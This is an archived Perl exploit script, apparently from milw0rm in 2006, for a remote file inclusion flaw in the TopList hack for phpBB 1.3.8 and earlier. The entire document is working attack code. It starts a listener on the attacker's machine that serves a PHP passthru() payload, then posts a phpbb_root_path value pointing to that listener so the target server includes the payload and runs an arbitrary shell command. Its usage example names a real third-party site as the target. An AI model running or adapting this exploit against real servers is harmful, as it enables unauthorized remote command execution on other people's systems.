<html><head><title>TopList <= 1.3.8 (phpBB Hack) Remote Inclusion Exploit</title></head><pre># TopList Hack for PHPBB &lt;= 1.3.8 Remote File Inclusion
# Based on http://milw0rm.com/exploits/1722
# Bug found by : [Oo]
#
# No more uploading php shells !!! 
# This is my way of php include exploitation !!!
# Learn to play with sockets !!!
# FOX_MULDER (fox_mulder@abv.bg)

#!/usr/bin/perl
  use LWP 5.64;
  use IO::Socket;
  use LWP::Simple;

(my $hostname, my $target, my $dir,my $command) = @ARGV;

if(@ARGV &lt; 4) {
print &quot;=======================================================================+\n&quot;;
print &quot;TopList REMOTE COMMAND EXECUTION EXPLOIT by fox_mulder\@abv.bg         |\n&quot;;
print &quot;Usage: top.pl yourIP target /dir/ \&quot;command\&quot;                            |\n&quot;;
print &quot;Example: top.pl 10.20.30.40 www.microsoft.com /forum/ \&quot;uname -a\&quot;     |\n&quot;;
print &quot;=======================================================================+\n&quot;;
exit;
}
print &quot;[+]Creating listening socket . . .\n&quot;;
my $sock = new IO::Socket::INET (
                                  LocalHost =&gt; &quot;$hostname&quot;,
                                  LocalPort =&gt; '9999',
                                  Proto =&gt; 'tcp',
                                  Listen =&gt; 1,
                                  Reuse =&gt; 1,
                                 );
 die &quot;Could not create socket: $!\n&quot; unless $sock;

        if (my $pid = fork){
        my $new_sock = $sock-&gt;accept();
                my $request = &lt;$new_sock&gt;;
                print $new_sock &quot;HTTP/1.1 200 OK\n&quot;;
                print $new_sock &quot;Content-Length: $content_length\n&quot;;
                print $new_sock &quot;Content-Type: text/plain\n\n&quot;;
                print $new_sock &quot;&lt;? error_reporting(0);passthru(\&quot;$command\&quot;); ?&gt;\n&quot;;
                close $new_sock;
                exit;
        }
print &quot;[+]Injecting  command . . .\n&quot;;

my $browser = LWP::UserAgent-&gt;new;
   $browser-&gt;agent('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)');

  my $url = &quot;http://$target/$dir/toplist.php&quot;;
  my $response = $browser-&gt;post( $url,
    [
	'f'            =&gt; &quot;toplist_top10&quot;,
        'phpbb_root_path' =&gt; &quot;http://$hostname:9999/blah.php&quot;
]
  );

  die &quot;Received invalid response type&quot;, $response-&gt;content_type
   unless $response-&gt;content_type eq 'text/html';

        print $response-&gt;content;

# milw0rm.com [2006-04-28]</pre></html>